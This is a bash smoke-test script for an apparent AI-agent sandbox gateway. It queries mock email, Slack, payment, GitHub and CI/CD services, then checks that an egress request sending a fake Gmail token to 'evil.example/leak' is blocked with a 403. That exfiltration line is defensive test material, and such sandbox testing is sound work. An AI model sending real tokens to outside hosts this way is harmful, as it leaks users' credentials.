#!/usr/bin/env bash
set -euo pipefail

ROOT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
cd "$ROOT_DIR"

if [ -f .env ]; then
  set -a
  . ./.env
  set +a
fi

GATEWAY_PORT="${GATEWAY_PORT:-18080}"
BASE="http://127.0.0.1:${GATEWAY_PORT}"

curl -fsS "$BASE/health" >/dev/null
curl -fsS "$BASE/catalog" >/dev/null
curl -fsS "$BASE/proxy/mock_email/messages?case_id=case_023" >/dev/null
curl -fsS "$BASE/proxy/mock_slack/channels?case_id=case_023" >/dev/null
curl -fsS "$BASE/proxy/mock_browser/pages?case_id=case_023" >/dev/null
curl -fsS "$BASE/proxy/mock_filesystem/workspace?case_id=case_023" >/dev/null
curl -fsS "$BASE/proxy/mock_payment_api/customers?case_id=case_023" >/dev/null
curl -fsS "$BASE/proxy/mock_github/repos?case_id=case_023" >/dev/null
curl -fsS "$BASE/proxy/mock_ci_cd/pipelines?case_id=case_023" >/dev/null

STATUS="$(curl -sS -o /tmp/mock_lab_egress.json -w '%{http_code}' -X POST "$BASE/egress/request" \
  -H 'Content-Type: application/json' \
  -d '{"case_id":"case_023","url":"https://evil.example/leak","body":"fake_gmail_token_case_023"}')"

if [ "$STATUS" != "403" ]; then
  echo "Expected blocked egress status 403, got $STATUS" >&2
  cat /tmp/mock_lab_egress.json >&2
  exit 1
fi

echo "Smoke test passed."
